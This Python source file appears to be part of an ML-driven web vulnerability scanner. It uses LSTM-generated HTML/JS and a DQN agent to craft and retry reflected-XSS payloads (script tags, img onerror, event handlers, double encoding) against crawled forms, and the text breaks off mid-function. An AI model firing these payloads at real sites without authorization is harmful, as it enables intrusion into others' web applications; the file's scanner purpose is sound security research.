# -*- coding: utf-8 -*-
from __future__ import print_function
from keras.models import Sequential
from keras.layers import Dense, Activation, Dropout
from keras.layers import LSTM
from keras.models import model_from_json
from MyAgent import Agent
from MyDecision import Decision
from MyEnvironment import Environment
from MyWord2Vec import Word2Vec
from requests import Request, Session
import numpy as np
import pickle
import urllib
import re
import os
import sys
import random
import string
import codecs
import datetime
import time

# learned HTML structure
str_learned_set_html = 'html_arrange3'
str_char_data_html = 'data\\' + str_learned_set_html + "\\char_data.pkl"
str_arch_data_html = 'data\\' + str_learned_set_html + "\\model_architecture.json"
str_model_data_html = 'data\\' + str_learned_set_html + "\\model.h5"
# learned JavaScript structure
str_learned_set_js = 'js_raw'
str_char_data_js = 'data\\' + str_learned_set_js + "\\char_data.pkl"
str_arch_data_js = 'data\\' + str_learned_set_js + "\\model_architecture.json"
str_model_data_js = 'data\\' + str_learned_set_js + "\\model.h5"
int_max_epoch = 20
int_maxlen = 100
int_step = 1

# const variable
PLACE_DOUBLE_QUOTE = 0
PLACE_SINGLE_QUOTE = 1
PLACE_UNQUOTE = 2
PLACE_JAVASCRIPT = 3
PLACE_PLAIN = 4
PROXY = {'http': '127.0.0.1:8083'}
MAX_LEARN_COUNT = 100


class XSS:
    # ScanResultTBLのカラム情報
    str_col_scanresulttbl = "site_id, " \
                            "page_no, " \
                            "param_type, " \
                            "param_name, " \
                            "param_value, " \
                            "signature_no, " \
                            "inspect_value, " \
                            "result, " \
                            "inspection, " \
                            "response_code, " \
                            "request_raw, " \
                            "response_raw, " \
                            "scan_date"

    # CredentialsTBLのカラム情報
    str_col_credentialstbl = "site_id, " \
                             "type, " \
                             "credential_info1, " \
                             "credential_info2, " \
                             "credential_info3, " \
                             "credential_info4, " \
                             "credential_info5, " \
                             "secret_question, " \
                             "secret_answer, " \
                             "temp"

    def __init__(self, int_param_count=0, str_train_action='TRAIN', obj_browser=None):
        self.obj_browser = obj_browser
        self.str_explore_value = 'saivs12345'
        self.int_param_count = int_param_count
        self.str_train = str_train_action
        self.str_dummy_file_path = "C:\\Users\\itaka\\PycharmProjects\\saivs\\dummy.png"

    # extract corpus
    def extract_corpus(self, str_learned_set, str_char_data):
        if os.path.exists(str_char_data):
            with open(str_char_data, 'r') as obj_file:
                dic_char_data = pickle.load(obj_file)
                str_text = dic_char_data["text"]
                chr_chars = dic_char_data["character"]
                chr_indices = dic_char_data["indices"]
                chr_indices_char = dic_char_data["indices_char"]

            # print('corpus length:', len(str_text))
            # print('total chars:', len(chr_chars))

            return str_text, chr_chars, chr_indices, chr_indices_char
        else:
            str_path = os.path.join('data', str_learned_set + 'learn_data.txt')
            str_text = open(str_path).read()
            # print('corpus length:', len(str_text))

            chr_chars = set(str_text)
            # print('total chars:', len(chr_chars))
            chr_indices = dict((c, i) for i, c in enumerate(chr_chars))
            chr_indices_char = dict((i, c) for i, c in enumerate(chr_chars))

            # store character data
            obj_store_data = {
                'text' : str_text,
                'character' : chr_chars,
                'indices' : chr_indices,
                'indices_char' : chr_indices_char
            }
            pickle.dump(obj_store_data, open(str_char_data, 'wb'))

            return str_text, chr_chars, chr_indices, chr_indices_char

    # learning model using keras
    def learning_model(self, str_text, chr_chars, chr_indices):
        # cut the text in semi-redundant sequences of maxlen characters
        lst_sentences = []
        lst_next_chars = []
        for int_idx in range(0, len(str_text) - int_maxlen, int_step):
            lst_sentences.append(str_text[int_idx: int_idx + int_maxlen])
            lst_next_chars.append(str_text[int_idx + int_maxlen])

        # print('nb sequences:', len(lst_sentences))

        # print('Vectorization...')
        obj_X = np.zeros((len(lst_sentences), int_maxlen, len(chr_chars)), dtype=np.bool)
        obj_y = np.zeros((len(lst_sentences), len(chr_chars)), dtype=np.bool)

        for int_idx, lst_sentence in enumerate(lst_sentences):
            for int_t, chr_char in enumerate(lst_sentence):
                obj_X[int_idx, int_t, chr_indices[chr_char]] = 1
            obj_y[int_idx, chr_indices[lst_next_chars[int_idx]]] = 1

        # build the model: 2 stacked LSTM
        print('Building LSTM model...')
        obj_model = Sequential()
        obj_model.add(LSTM(512, return_sequences=True, input_shape=(int_maxlen, len(chr_chars))))
        obj_model.add(Dropout(0.2))
        obj_model.add(LSTM(512, return_sequences=False))
        obj_model.add(Dropout(0.2))
        obj_model.add(Dense(len(chr_chars)))
        obj_model.add(Activation('softmax'))
        obj_model.compile(loss='categorical_crossentropy', optimizer='rmsprop')

        # train the model
        for int_iteration in range(1, int_max_epoch):
            print()
            print('-' * 50)
            print('Iteration', int_iteration)

            # train the model
            obj_model.fit(obj_X, obj_y, batch_size=128, nb_epoch=1)

            # save learned model using h5py
            str_json = obj_model.to_json()
            open('model_architecture_' + str(int_iteration) + '.json', 'w').write(str_json)
            obj_model.save_weights('model_' + str(int_iteration) + '.h5')
            print('saved:', 'model_architecture_' + str(int_iteration) + '.json')
            print('saved:', 'model_' + str(int_iteration) + '.h5')

        print('Finish training!!')
        return obj_model

    # generated text
    def generated_text(self, obj_model, str_seed, chr_chars, chr_indices, chr_indices_char, flt_diversity=0.2):
        str_generated = ''

        # adjust seed size (match the maximum length)
        int_diff_len = len(str_seed) - int_maxlen
        if int_diff_len < 0:
            str_seed = (' ' * (int_diff_len * -1)) + str_seed
        elif int_diff_len > 0:
            str_seed = str_seed[int_diff_len:]

        int_resize_seed_len = len(str_seed)
        str_generated += str_seed
        print("Seed : '%s'" % str_seed)

        sys.stdout.write("Generating HTML syntax.")
        for i in range(20):
            obj_x = np.zeros((1, int_maxlen, len(chr_chars)))
            for int_t, chr_char in enumerate(str_seed):
                try:
                    obj_x[0, int_t, chr_indices[chr_char]] = 1.
                except:
                    str_seed = str_seed.replace(chr_char, '')

            obj_preds = obj_model.predict(obj_x, verbose=0)[0]
            int_next_index = self.extract_candidate(obj_preds, flt_diversity)
            chr_next_char = chr_indices_char[int_next_index]

            str_generated += chr_next_char
            str_seed = str_seed[1:] + chr_next_char
            sys.stdout.write(".")

        return str_generated, int_resize_seed_len

    # extract generated text of candidates
    def extract_candidate(self, a, temperature=1.0):
        # helper function to sample an index from a probability array
        a = np.log(a) / temperature
        a = np.exp(a) / np.sum(np.exp(a))

        return np.argmax(np.random.multinomial(1, a, 1))

    # set attack vector
    def set_first_attack_vector(self, int_output_place, str_dquote, str_squote, str_start, str_end, str_script, str_script_js):
        str_attack_value = str_dquote + str_squote + str_start + str_script + str_end
        if int_output_place == PLACE_DOUBLE_QUOTE:
            return str_attack_value
        elif int_output_place == PLACE_SINGLE_QUOTE:
            return str_attack_value
        elif int_output_place == PLACE_UNQUOTE:
            return str_attack_value
        elif int_output_place == PLACE_JAVASCRIPT:
            str_attack_value_js = str_script_js
            return str_attack_value_js
        elif int_output_place == PLACE_PLAIN:
            return str_attack_value

    # アルファベット大文字小文字+数字(0-9, a-z, A-F)
    def gen_rand_str(self, int_length, str_chars=None):
        if str_chars is None:
            str_chars = string.digits + string.letters
        return ''.join([random.choice(str_chars) for i in range(int_length)])

    # get action
    def get_action(self, int_output_place):
        if int_output_place == PLACE_PLAIN or \
           int_output_place == PLACE_DOUBLE_QUOTE or \
           int_output_place == PLACE_SINGLE_QUOTE or\
           int_output_place == PLACE_UNQUOTE:
            lst_actions = ['"><sCriPt>alert(3122)</sCriPt>',
                           "'><sCriPt>alert(3122)</sCriPt>",
                           '><sCriPt>alert(3122)</sCriPt>',
                           '"><img src=x onerror=alert(3122)>',
                           "'><img src=x onerror=alert(3122)>",
                           '><img src=x onerror=alert(3122)>',
                           '"><a onmouseover=alert(3122)></a>',
                           "'><a onmouseover=alert(3122)></a>",
                           '><a onmouseover=alert(3122)></a>',
                           '"onmouseover=alert(3122)',
                           "'onmouseover=alert(3122)",
                           ' onmouseover=alert(3122)',
                           '" src=saivs.jp',
                           "' src=saivs.jp",
                           ' src=saivs.jp',
                           'double_encode']
        else:
            lst_actions = [';alert(3122);//',
                           "';alert(3122);//",
                           ';alert(3122);//',
                           '\";alert(3122);//',
                           "\';alert(3122);//",
                           '*/alert(3122);//',
                           '%0d%0aalert(3122);//',
                           'double_encode',
                           '"\'><()',
                           '"\'><()',
                           '"\'><()',
                           '"\'><()',
                           '"\'><()',
                           '"\'><()',
                           '"\'><()',
                           '"\'><()']

        return lst_actions

    # send request
    def send_request(self, obj_db_control, obj_crawl_agent, lst_target_row, lst_flow, str_add_value):
        # ルートから当該ページの一つ手前まで遷移
        obj_session = None
        obj_session = Session()
        self.flow_replay(obj_session, obj_db_control, obj_crawl_agent, lst_target_row, lst_flow)

        # 最新のパラメータ構成を取得
        obj_decision = Decision()
        dic_post_params, bol_skip_flag = obj_decision.update_post_parameter(obj_db_control, lst_target_row)

        # 学習結果に基づき遷移に最適なパラメータ値を設定
        int_idx = 0
        bol_relearn_flag = False
        lst_param_names = lst_target_row[13].split('&')
        lst_param_types = lst_target_row[21].split(',')
        lst_label_names = lst_target_row[22].split(',')
        while int_idx < int(lst_target_row[14]):
            # 対象パラメータがhiddenではない。かつ、ログイン処理(1)ではない場合。
            if lst_label_names[int_idx] != '@' and lst_target_row[3] != 1:
                str_sql = "SELECT value from WordSimilarityTBL where word like '%" \
                          + lst_label_names[int_idx] + "%';"
                obj_cursor = obj_db_control.select(str_sql)
                lst_all_row = obj_cursor.fetchall()
                lst_param_names_tmp = lst_param_names[int_idx].split('=')
                # 類似単語が類似単語管理テーブルに存在する
                if len(lst_all_row) != 0:
                    lst_candidate = list(lst_all_row[0])
                    str_candidate_value = str(lst_candidate[0])
                    int_find_idx = str_candidate_value.find('@')
                    if int_find_idx > 0:
                        str_random_value = ''.join([random.choice(string.digits) for i in range(int_find_idx)])
                        str_candidate_value = str_random_value + str_candidate_value[int_find_idx:]
                    dic_post_params[lst_param_names_tmp[0]] = str_candidate_value
                # 類似単語が類似単語管理テーブルに存在しない
                else:
                    obj_word2vec = Word2Vec()
                    obj_result = obj_word2vec.get_candidate_word(lst_label_names[int_idx])
                    if obj_result is not False:
                        for r in obj_result:
                            str_sql = "SELECT value from WordSimilarityTBL where word like '%" \
                                      + r[0] + "%';"
                            obj_cursor = obj_db_control.select(str_sql)
                            lst_all_row = obj_cursor.fetchall()
                            if len(lst_all_row) != 0:
                                print("Use the '%s'." % r[0])
                                lst_candidate = list(lst_all_row[0])
                                str_candidate_value = str(lst_candidate[0])
                                int_find_idx = str_candidate_value.find('@')
                                if int_find_idx > 0:
                                    str_random_value = \
                                        ''.join([random.choice(string.digits) for i in range(int_find_idx)])
                                    str_candidate_value = str_random_value + str_candidate_value[int_find_idx:]
                                dic_post_params[lst_param_names_tmp[0]] = str_candidate_value
                                break
                        # time.sleep(2)
                        if dic_post_params[lst_param_names_tmp[0]] == '':
                            bol_relearn_flag = True
                    else:
                        bol_relearn_flag = True
            int_idx += 1

        if bol_relearn_flag is True:
            print("Finished analogy.")
            print("\n")
            # return
        # パラメータ値にシグネチャを付与
        lst_param_name = dic_post_params.keys()
        str_param_name = lst_param_name[self.int_param_count]
        str_original_param_value = dic_post_params[str_param_name]
        dic_post_params[str_param_name] += str_add_value

        # ScanResultTBL用の返却値セット
        lst_return_data = [str_param_name, str_original_param_value, dic_post_params[str_param_name]]

        # POSTリクエスト(診断リクエスト)の送信
        if lst_target_row[19] == "multipart/form-data":
            # マルチパートリクエスト
            dic_post_files = {}
            dic_post_data = {}

            # ファイルを保持するパラメータと通常のパラメータに切り分ける
            dic_post_files, dic_post_data = obj_decision.divide_params(lst_target_row[21],
                                                                       dic_post_params,
                                                                       self.str_dummy_file_path
                                                                       )

            obj_request = Request("POST",
                                  obj_decision.assemble_url(lst_target_row),
                                  files=dic_post_files,
                                  data=dic_post_data
                                  )
        else:
            # 通常のリクエスト
            if lst_target_row[8] == 'POST':
                obj_request = Request("POST",
                                      obj_decision.assemble_url(lst_target_row),
                                      data=dic_post_params
                                      )
            else:
                obj_request = Request("GET",
                                      obj_decision.assemble_url(lst_target_row),
                                      params=dic_post_params
                                      )

        obj_prepped = obj_session.prepare_request(obj_request)
        obj_response = obj_session.send(obj_prepped,
                                        verify=True,
                                        timeout=60,
                                        proxies=PROXY,
                                        allow_redirects=False
                                        )

        # レスポンスをブラウザに表示（デモ用）
        if obj_response is not None:
            self.obj_browser.write_response_to_html(obj_response.text, obj_response.encoding)
            self.obj_browser.refresh_browser()

        # レスポンスがリダイレクトの場合
        # リダイレクトが終了するまで繰り返しリダイレクト
        # 直後のレスポンスとリダイレクト先のレスポンスを判定対象にする
        while obj_response.is_redirect is True:
            # Locationヘッダから遷移先URLを取得
            dic_res_headers = obj_response.headers._store
            tpl_location_header = dic_res_headers["location"]
            str_redirect_url = tpl_location_header[1]
            if 'http' not in str_redirect_url and 'https' not in str_redirect_url:
                str_fqdn = lst_target_row[9].encode() + "://" + lst_target_row[10].encode() + ":" + str(lst_target_row[11])
                if str_redirect_url.startswith('/') is False:
                    str_redirect_url = '/' + str_redirect_url
                str_redirect_url = str_fqdn + str_redirect_url

            # リダイレクト
            obj_request = Request("GET", str_redirect_url)
            obj_prepped = obj_session.prepare_request(obj_request)
            obj_response = obj_session.send(obj_prepped,
                                            verify=True,
                                            timeout=60,
                                            proxies=PROXY,
                                            allow_redirects=False
                                            )

            # レスポンスをブラウザに表示（デモ用）
            if obj_response is not None:
                self.obj_browser.write_response_to_html(obj_response.text, obj_response.encoding)
                self.obj_browser.refresh_browser()

        return obj_response, lst_return_data


    # retrying attack using DQN
    def retrying_attack(self, obj_session, str_gen_text, str_original_attack_value, str_action,
                        obj_db_control, obj_crawl_agent, lst_target_row, lst_flow):
        # additional of attack vector and attack using normal pattern
        # double encode attack
        if str_action == 'double_encode':
            str_attack_value = urllib.quote(str_original_attack_value.encode('utf-8'))
            str_attack_value = urllib.quote(str_attack_value.encode('utf-8'))
        else:
            str_attack_value = str_gen_text + str_action
            # str_attack_value = str_action

        print('Attack value:', str_attack_value)
        print('Attack!!')
        # attack
        obj_response = None
        str_html = ''
        try:
            # reproduction of flow & send attack request
            obj_response, lst_return_data = self.send_request(obj_db_control,
                                                              obj_crawl_agent,
                                                              lst_target_row,
                                                              lst_flow,
                                                              str_attack_value
                                                              )
            str_html = obj_response.text
        except:
            print('connection error : retry attack phase.')
            sys.exit(1)
        codecs.open('xss_test3.html', 'w', 'utf-8').write(str_html)

        # judge
        if str_action == 'double_encode':
            str_attack_value = urllib.unquote(str_attack_value)
            str_attack_value = urllib.unquote(str_attack_value)
            str_action = str_attack_value
        if str_html.find(str_action) >= 0:
            return 1000, True, obj_response
        else:
            return -1000, False, obj_response

    # judgement of output place
    def judge_output_place(self, str_response, int_front_index, int_back_index):
        # judgement of attribute value
        if str_response[int_front_index-2:int_front_index] == "=\"":
            # using double quote
            print("Output place : Double quote")
            return PLACE_DOUBLE_QUOTE
        elif str_response[int_front_index-2:int_front_index] == "='":
            # using single quote
            print("Output place : Single quote")
            return PLACE_SINGLE_QUOTE
        elif str_response[int_front_index-1] == "=":
            # using unquote
            print("Output place : No quote")
            return PLACE_UNQUOTE

        # judgement of other pattern(plain or javascript)
        int_idx = int_front_index
        int_right_arrow_idx = 0
        bol_right_arrow_flg = False
        int_left_arrow_idx = 0
        bol_left_arrow_flg = False
        while int_idx != 0:
            if str_response[int_idx] == ">" and bol_right_arrow_flg is False:
                int_right_arrow_idx = int_idx
                bol_right_arrow_flg = True
            elif str_response[int_idx] == "<" and bol_left_arrow_flg is False:
                int_left_arrow_idx = int_idx
                bol_left_arrow_flg = True
            int_idx -= 1

        if int_right_arrow_idx > int_left_arrow_idx:
            # using javascript
            # print(str_response[int_left_arrow_idx+1:int_left_arrow_idx+1+len("script")])
            if str_response[int_left_arrow_idx+1:int_left_arrow_idx+1+len("script")] == "script":
                print("Output place : JavaScript")
                return PLACE_JAVASCRIPT
            # plain
            else:
                print ("Output place : Plain")
                return PLACE_PLAIN
        elif int_right_arrow_idx == int_left_arrow_idx:
            # plain(no html)
            return PLACE_PLAIN
        else:
            # unknown(same plain
            return PLACE_PLAIN

    # UrlTreeTBLを基に画面遷移を再現
    def flow_replay(self, obj_session, obj_db_control, obj_agent, lst_row, lst_flow):
        obj_decision = Decision()
        obj_env = Environment()
        int_flow_idx = 1
        bol_flow_status = True

        while int_flow_idx < len(lst_flow):
            lst_value = []
            int_page_no = lst_flow[len(lst_flow) - int_flow_idx]
            str_sql = "SELECT * FROM UrlTreeTBL WHERE site_id = 1 AND page_no = " + str(int_page_no)
            obj_cursor = obj_db_control.select(str_sql)
            lst_flow_row = obj_cursor.fetchone()

            bol_skip_flag = False
            obj_response = None
            # POSTパラメータが存在する場合
            if lst_flow_row[13] != '':
                # 親ページのレスポンス内から最新のパラメータ値を取得
                dic_post_flow_params = {}
                dic_post_flow_params, bol_skip_flag = obj_decision.update_post_parameter(obj_db_control,
                                                                                         lst_flow_row)

                # ログイン処理以外の場合
                if lst_flow_row[3] != 1:
                    # ε-greedyで行動パターンを選択
                    # 状態(State)の設定(親ページNo、次ページNo、遷移状態(0…初期、1…成功、-1…エラー)
                    lst_state = [lst_flow_row[6], lst_flow_row[2], 0]
                    int_action_index, nd_values = obj_agent.act(np.array(lst_state, dtype=np.uint8))
                    dic_post_flow_params = obj_env.index_to_action(int_action_index, dic_post_flow_params)

                # POSTリクエストの送信
                obj_request = None
                if lst_flow_row[19] == "multipart/form-data":
                    # マルチパートリクエスト
                    dic_post_files = {}
                    dic_post_data = {}

                    # ファイルを保持するパラメータと通常のパラメータに切り分ける
                    dic_post_files, dic_post_data = obj_decision.divide_params(lst_flow_row[21],
                                                                               dic_post_flow_params,
                                                                               self.str_dummy_file_path)

                    obj_request = Request("POST",
                                          obj_decision.assemble_url(lst_row),
                                          files=dic_post_files,
                                          data=dic_post_data
                                          )
                else:
                    # 通常のリクエスト
                    if lst_flow_row[8].upper() == 'POST':
                        obj_request = Request("POST",
                                              obj_decision.assemble_url(lst_flow_row),
                                              data=dic_post_flow_params
                                              )
                    else:
                        obj_request = Request("GET",
                                              obj_decision.assemble_url(lst_flow_row),
                                              params=dic_post_flow_params
                                              )

                obj_prepped = obj_session.prepare_request(obj_request)
                obj_response = obj_session.send(obj_prepped,
                                                verify=True,
                                                timeout=60,
                                                proxies=PROXY,
                                                allow_redirects=False
                                                )
            else:
                obj_request = Request("GET",
                                      obj_decision.assemble_url(lst_flow_row),
                                      )
                obj_prepped = obj_session.prepare_request(obj_request)
                obj_response = obj_session.send(obj_prepped,
                                                verify=True,
                                                timeout=60,
                                                proxies=PROXY,
                                                allow_redirects=False
                                                )

            # レスポンスをブラウザに表示（デモ用）
            if obj_response is not None:
                self.obj_browser.write_response_to_html(obj_response.text, obj_response.encoding)
                self.obj_browser.refresh_browser()

            # レスポンスがリダイレクトの場合
            # リダイレクトが終了するまで繰り返しリダイレクト
            while obj_response.is_redirect is True:
                # Locationヘッダから遷移先URLを取得
                dic_res_headers = obj_response.headers._store
                tpl_location_header = dic_res_headers["location"]
                str_redirect_url = tpl_location_header[1]
                if 'http://' not in str_redirect_url and 'https://' not in str_redirect_url:
                    str_fqdn = lst_row[9].encode() + "://" + lst_row[10].encode() + ":" + str(lst_row[11])
                    if str_redirect_url.startswith('/') is False:
                        str_redirect_url = '/' + str_redirect_url
                    str_redirect_url = str_fqdn + str_redirect_url

                # リダイレクト
                obj_request = Request("GET", str_redirect_url)
                obj_prepped = obj_session.prepare_request(obj_request)
                obj_response = obj_session.send(obj_prepped,
                                                verify=True,
                                                timeout=60,
                                                proxies=PROXY,
                                                allow_redirects=False
                                                )

                # レスポンスをブラウザに表示（デモ用）
                if obj_response is not None:
                    self.obj_browser.write_response_to_html(obj_response.text, obj_response.encoding)
                    self.obj_browser.refresh_browser()

            # エラーが返ってきた場合の処理
            # TODO
            bol_flow_status = True

            # 最新のレスポンス値に更新
            if bol_skip_flag is False:
                str_parent_sql = "UPDATE UrlTreeTBL SET" \
                                 " response_raw = ?" \
                                 " WHERE id = ?;"
                lst_parent_value = [obj_response.text, lst_flow_row[0]]
                obj_db_control.update(str_parent_sql, lst_parent_value)

            int_flow_idx += 1

        return bol_flow_status

    # XSS main controller
    def exec_xss(self, obj_db_control, obj_crawl_agent, lst_target_row, lst_flow):
        obj_model = None
        str_mode = self.str_train

        print("\n")
        print("################# Explore outout place #####################")
        # time.sleep(1)

        # accessing target url
        str_html = ''
        obj_session = None
        try:
            # reproduction of flow & send to searching output place request
            obj_response, lst_return_data = self.send_request(obj_db_control,
                                                              obj_crawl_agent,
                                                              lst_target_row,
                                                              lst_flow,
                                                              self.str_explore_value
                                                              )
            str_html = obj_response.text
        except:
            print('connection error : explore phase.')
            sys.exit(1)

        # judgement of output place
        int_end_index = str_html.rfind(self.str_explore_value)
        if int_end_index == -1:
            print("Param '%s' doesn't output." % lst_return_data[0])
            print("No RXSS.")
            # time.sleep(1)
            return

        int_output_place = 0
        if int_end_index <= 2:
            # plain
            int_output_place = PLACE_PLAIN
        # not found xss
        elif int_end_index == -1:
            print('No RXSS.')
            sys.exit()
        else:
            # without plain
            int_output_place = self.judge_output_place(str_html.lower(),
                                                       int_end_index,
                                                       int_end_index + len(self.str_explore_value)
                                                       )
            print("#################### Finish explore ########################")
            print("\n")
            # time.sleep(1)

        str_seed = str_html[:int_end_index].lower()
        str_seed = re.sub(r'="\w+"', '=""', str_seed, 0)
        str_seed = re.sub(r'\n', "", str_seed, 0)
        if int_output_place != PLACE_JAVASCRIPT:
            str_seed = re.sub(r'[\(\)\.,\&;\:\r\[\]\?]+', "", str_seed, 0)

        # print('origin seed: ', str_seed)

        # load learned model & compile
        str_learned_set = ''
        str_char_data = ''
        str_arch_data = ''
        str_model_data = ''
        if int_output_place == PLACE_JAVASCRIPT:
            str_learned_set = str_learned_set_js
            str_char_data = str_char_data_js
            str_arch_data = str_arch_data_js
            str_model_data = str_model_data_js
        else:
            str_learned_set = str_learned_set_html
            str_char_data = str_char_data_html
            str_arch_data = str_arch_data_html
            str_model_data = str_model_data_html
        if os.path.exists(str_arch_data) and os.path.exists(str_model_data):
            obj_model = model_from_json(open(str_arch_data).read())
            obj_model.load_weights(str_model_data)

            # compile model
            obj_model.compile(loss='categorical_crossentropy', optimizer='rmsprop')

            # extract_corpus
            str_text, chr_chars, chr_indices, chr_indices_char = self.extract_corpus(str_learned_set, str_char_data)
        else:
            # learning
            str_text, chr_chars, chr_indices, chr_indices_char = self.extract_corpus(str_learned_set, str_char_data)
            obj_model = self.learning_model(str_text, chr_chars, chr_indices)

        # generate text
        print("####################### 1st Attack #########################")
        if int_output_place == PLACE_JAVASCRIPT:
            int_maxlen = 30
        str_gen_text, int_seed_len = self.generated_text(obj_model,
                                                         str_seed,
                                                         chr_chars,
                                                         chr_indices,
                                                         chr_indices_char,
                                                         1.2
                                                         )
        print("Generated HTML syntax : '%s'" % str_gen_text)

        # decide inserting point
        if int_output_place == PLACE_DOUBLE_QUOTE:
            str_gen_text = str_gen_text[int_seed_len:]
        elif int_output_place == PLACE_SINGLE_QUOTE:
            str_gen_text = str_gen_text[int_seed_len:]
        elif int_output_place == PLACE_UNQUOTE:
            str_gen_text = str_gen_text[int_seed_len:]
        elif int_output_place == PLACE_PLAIN:
            obj_match = re.search(r'</[a-z]+>', str_gen_text[int_seed_len:])
            if obj_match:
                str_gen_text = str_gen_text[int_seed_len:int_seed_len+obj_match.end()]
            else:
                str_gen_text = str_gen_text[int_seed_len:]
        else:
            str_gen_text = str_gen_text[int_seed_len:]
        print("Additional HTML syntax : '%s'" % str_gen_text)

        # additional of attack vector and attack using normal pattern
        str_dquote_marker = self.gen_rand_str(5) + '"'
        str_squote_marker = self.gen_rand_str(5) + "'"
        str_start_tag_marker = self.gen_rand_str(5) + '<script>'
        str_end_tag_marker = '</script>' + self.gen_rand_str(5)
        str_script_marker = 'alert(3122);' + self.gen_rand_str(5)
        str_script_js_marker = ';alert(3122);//' + self.gen_rand_str(5)
        str_signature_xss = self.set_first_attack_vector(int_output_place,
                                                         str_dquote_marker,
                                                         str_squote_marker,
                                                         str_start_tag_marker,
                                                         str_end_tag_marker,
                                                         str_script_marker,
                                                         str_script_js_marker
                                                         )
        str_attack_value = str_gen_text + str_signature_xss
        print("Attack value :'" + str_attack_value + "'")
        print('Attack!!')
        # time.sleep(1)
        # attack
        str_html = ''
        try:
            # reproduction of flow & send attack request
            obj_response, lst_return_data = self.send_request(obj_db_control,
                                                              obj_crawl_agent,
                                                              lst_target_row,
                                                              lst_flow,
                                                              str_attack_value
                                                              )
            str_html = obj_response.text
        except:
            print('Connection error : initial attack phase.')
            sys.exit(1)
        # codecs.open('xss_test2.html', 'w', 'utf-8').write(str_html)

        # judge
        print('Judgement.')
        int_result = 0
        str_inspect_value = ''
        if str_html.find(str_gen_text[int_seed_len:] + str_signature_xss) >= 0:
            int_result = 1
            print("Detect RXSS!!")
            # 1stの診断結果をScanResultTBLに追加
            str_sql = "INSERT INTO ScanResultTBL(" + self.str_col_scanresulttbl + ") " \
                      "VALUES (?, ?, 4, ?, ?, ?, ?, ?, 0, ?, ?, ?, ?)"
            lst_value = [int(lst_target_row[1]),
                         int(lst_target_row[2]),
                         lst_return_data[0],
                         lst_return_data[1],
                         "1st RXSS",
                         str_attack_value,
                         int_result,
                         obj_response.status_code,
                         "no data",
                         obj_response.text,
                         datetime.datetime.today()]
            obj_db_control.insert(str_sql, lst_value)
        else:
            # 1stの診断結果をScanResultTBLに追加
            str_sql = "INSERT INTO ScanResultTBL(" + self.str_col_scanresulttbl + ") " \
                      "VALUES (?, ?, 4, ?, ?, ?, ?, ?, 0, ?, ?, ?, ?)"
            lst_value = [int(lst_target_row[1]),
                         int(lst_target_row[2]),
                         lst_return_data[0],
                         lst_return_data[1],
                         "1st RXSS",
                         str_attack_value,
                         int_result,
                         obj_response.status_code,
                         "no data",
                         obj_response.text,
                         datetime.datetime.today()]
            obj_db_control.insert(str_sql, lst_value)

            print("Not detect RXSS.")
            print("Retry...")
            # time.sleep(2)

            # judgement of input strict
            # define state
            print("\n")
            print("####################### 2nd Attack #########################")
            lst_input_strict = [0, 0, 0, 0, 0]
            if str_html.find(str_dquote_marker) >= 0:
                lst_input_strict[0] = 1
            if str_html.find(str_squote_marker) >= 0:
                lst_input_strict[1] = 1
            if str_html.find(str_start_tag_marker) >= 0:
                lst_input_strict[2] = 1
            if str_html.find(str_script_js_marker) >= 0:
                lst_input_strict[3] = 1
            if str_html.find(str_end_tag_marker) >= 0:
                lst_input_strict[4] = 1

            # get attack actions
            lst_actions = self.get_action(int_output_place)

            # using DQN
            lst_state = [int_output_place]
            lst_state.extend(lst_input_strict)
            nd_state = np.array(lst_state, dtype=np.uint8)
            obj_attack_agent = Agent(save_name='dqn_xss')
            obj_attack_agent.build_dqn(state_size=nd_state.shape, number_of_actions=len(lst_actions))
            obj_attack_agent.new_episode()
            bol_done = False
            int_total_cost = 0.0
            int_total_reward = 0.0
            int_frame = 0
            nd_values = []
            while int_frame <= MAX_LEARN_COUNT and self.str_train == 'TRAIN':
                int_frame += 1
                int_action, nd_values = obj_attack_agent.act(nd_state)
                int_reward, bol_done, obj_response = self.retrying_attack(obj_session,
                                                                         str_gen_text,
                                                                         str_attack_value,
                                                                         lst_actions[int_action],
                                                                         obj_db_control,
                                                                         obj_crawl_agent,
                                                                         lst_target_row,
                                                                         lst_flow
                                                                         )
                int_total_cost += obj_attack_agent.observe(int_reward)
                int_total_reward += int_reward
                print('frame:%d / total reward:%d / total cost:%f / action:%d / reward:%d' %
                      (int_frame, int_total_reward, int_total_cost, int_action, int_reward))
                obj_attack_agent.new_episode()
            print('attack using learned data.')
            int_action, nd_values = obj_attack_agent.act(nd_state)
            lst_attack = np.argsort(nd_values)[0].tolist()
            int_attack_num = len(lst_attack) - 1
            int_count = 1
            while int_count < int_attack_num:
                str_inspect_value = lst_actions[lst_attack[int_attack_num - int_count]]
                int_reward, bol_done, obj_response = self.retrying_attack(obj_session,
                                                                          str_gen_text,
                                                                          str_attack_value,
                                                                          lst_actions[lst_attack[int_attack_num - int_count]],
                                                                          obj_db_control,
                                                                          obj_crawl_agent,
                                                                          lst_target_row,
                                                                          lst_flow
                                                                          )
                if bol_done is True:
                    int_result = 1
                    print("Detect RXSS!!")
                    print("Attack count : %d" % int_count)

                # 診断結果をScanResultTBLに追加
                str_sql = "INSERT INTO ScanResultTBL(" + self.str_col_scanresulttbl + ") " \
                          "VALUES (?, ?, 4, ?, ?, ?, ?, ?, 0, ?, ?, ?, ?)"
                lst_value = [int(lst_target_row[1]),
                             int(lst_target_row[2]),
                             lst_return_data[0],
                             lst_return_data[1],
                             "2nd RXSS",
                             str_inspect_value,
                             int_result,
                             obj_response.status_code,
                             "no data",
                             obj_response.text,
                             datetime.datetime.today()]
                obj_db_control.insert(str_sql, lst_value)
                if bol_done is True:
                    break

                int_count += 1

        # パスワード復帰(会員情報変更&パスワード変更の場合)
        # オリジナルのPOSTリクエストの送信
        '''
        if lst_target_row[3] == 5:
            # 最新のパラメータ構成を取得
            obj_decision = Decision()
            dic_post_params_original, bol_skip_flag = obj_decision.update_post_parameter(obj_db_control,
                                                                                         lst_target_row)

            # 学習結果に基づき遷移に最適なパラメータ値を設定
            lst_state = [lst_target_row[6], lst_target_row[2], 0]
            nd_state = np.array(lst_state, dtype=np.uint8)
            int_action_index, nd_values = obj_crawl_agent.act(nd_state)
            obj_env = Environment()
            obj_env.update_random_params()
            dic_post_params_original = obj_env.index_to_action(int_action_index, dic_post_params_original)

            if lst_target_row[19] == "multipart/form-data":
                # マルチパートリクエスト
                dic_post_files = {}
                dic_post_data = {}

                # ファイルを保持するパラメータと通常のパラメータに切り分ける
                dic_post_files, dic_post_data = obj_decision.divide_params(lst_target_row[21],
                                                                           dic_post_params_original,
                                                                           self.str_dummy_file_path
                                                                           )

                obj_request = Request("POST",
                                      obj_decision.assemble_url(lst_target_row),
